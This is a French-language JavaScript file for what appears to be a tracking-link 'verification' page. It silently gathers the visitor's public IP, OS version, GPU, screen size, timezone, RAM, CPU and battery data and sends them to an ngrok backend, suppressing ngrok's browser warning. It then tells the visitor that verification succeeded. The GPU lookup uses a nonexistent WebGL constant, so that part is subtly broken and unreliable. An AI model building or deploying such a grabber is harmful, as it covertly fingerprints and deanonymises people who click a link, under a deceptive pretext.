const urlParams = new URLSearchParams(window.location.search);
const linkId = urlParams.get('id');
const BACKEND_URL = "https://activism-suggest-probation.ngrok-free.dev/save-data";

if (!linkId) {
    document.getElementById('status').innerText = "err mauvais lien.";
} else {
    const getHighEntropyValues = () => {
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            return navigator.userAgentData.getHighEntropyValues(['platformVersion'])
                .then(ua => {
                    const majorVersion = parseInt(ua.platformVersion.split('.')[0], 10);
                    if (navigator.userAgentData.platform === "Windows" && majorVersion >= 13) {
                        return "Windows 11";
                    }
                    return null;
                }).catch(() => null);
        }
        return Promise.resolve(null);
    };

    const getGPUInfo = () => {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "Inconnu";
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return "Inconnu";
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_RENDERER_STRING) || "Inconnu";
        } catch (e) {
            return "Inconnu";
        }
    };

    Promise.all([
        fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: null })),
        navigator.getBattery ? navigator.getBattery().catch(() => null) : Promise.resolve(null),
        getHighEntropyValues()
    ]).then(([ipData, battery, exactOS]) => {
        const donnéesAEnvoyer = {
            id_lien: linkId,
            forceIPv4: ipData.ip,
            exactOS: exactOS,
            gpu: getGPUInfo(),
            resolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sombre' : 'Clair',
            processeur: navigator.hardwareConcurrency || 'Inconnu',
            ram: navigator.deviceMemory || 'Inconnu',
            batterie: battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? 'En charge' : 'Sur batterie'})` : 'Inconnue'
        };

        return fetch(BACKEND_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "ngrok-skip-browser-warning": "any-value"
            },
            body: JSON.stringify(donnéesAEnvoyer)
        });
    })
    .then(() => {
        document.getElementById('status').innerText = "Vérification réussie ! Vous pouvez retourner à votre activité précédente.";
    })
    .catch(() => {
        document.getElementById('status').innerText = "Erreur de connexion au serveur";
    });
}